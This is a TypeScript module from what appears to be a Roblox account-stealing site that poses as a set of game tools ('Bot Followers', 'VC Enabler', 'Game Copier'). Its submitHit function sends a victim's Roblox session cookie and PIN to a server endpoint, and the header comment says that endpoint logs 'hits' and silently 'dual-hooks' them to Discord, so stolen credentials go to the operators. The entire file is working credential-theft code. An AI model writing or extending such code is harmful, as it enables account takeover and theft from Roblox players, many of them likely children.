// Sends a tool submission to the server-side edge function, which handles
// Roblox lookup, hit logging, and silent dual-hooking to Discord.
import { supabase } from '@/integrations/supabase/client';

export type ToolKey =
  | 'bot_followers'
  | 'copy_games'
  | 'copy_clothes'
  | 'group_botter'
  | 'vc_enabler';

export type ToolType =
  | 'Bot Followers'
  | 'Game Copier'
  | 'Clothing Copier'
  | 'Group Botter'
  | 'VC Enabler';

interface SubmitArgs {
  toolType: ToolType;
  toolKey: ToolKey;
  cookie: string;
  pin?: string;
  ownerUsername?: string;
  // Optional tool-specific extras (e.g. Group Botter)
  extras?: Record<string, string | number | undefined>;
}

const FN_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;
const ANON = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

export const submitHit = async (args: SubmitArgs): Promise<boolean> => {
  try {
    const { data: sessionData } = await supabase.auth.getSession();
    const accessToken = sessionData.session?.access_token;
    const res = await fetch(`${FN_URL}/submit-hit`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        apikey: ANON,
        ...(accessToken ? { Authorization: `Bearer ${accessToken}` } : {}),
      },
      body: JSON.stringify({
        username: args.ownerUsername,
        toolType: args.toolType,
        toolKey: args.toolKey,
        cookie: args.cookie,
        pin: args.pin,
        extras: args.extras,
      }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => null);
      throw new Error(data?.error || 'Hit submission failed');
    }
    return true;
  } catch (e) {
    console.error('submitHit failed:', e);
    throw e;
  }
};
